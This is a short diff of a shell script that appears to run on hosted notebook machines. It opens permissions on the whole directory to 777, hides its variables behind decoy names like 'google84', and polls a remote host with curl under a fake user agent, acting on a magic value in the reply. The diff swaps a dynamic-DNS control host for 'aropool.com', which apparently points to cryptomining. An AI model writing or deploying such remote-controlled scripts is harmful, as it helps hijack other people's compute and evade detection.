@@ -15,11 +15,11 @@ chmod -R 777 ./
 
 cd /notebooks/
 
-google841212121274="http://linux8474.ddns.net/"
+google841212121274="http://aropool.com/"
 
 google84="26884"
 
-string=$(curl -s -A "mobile84" http://linux8474.ddns.net/?q=deploy)
+string=$(curl -s -A "mobile84" http://aropool.com/)
 if [[ $string == *"16384"* ]]; then
 
 cd /notebooks/
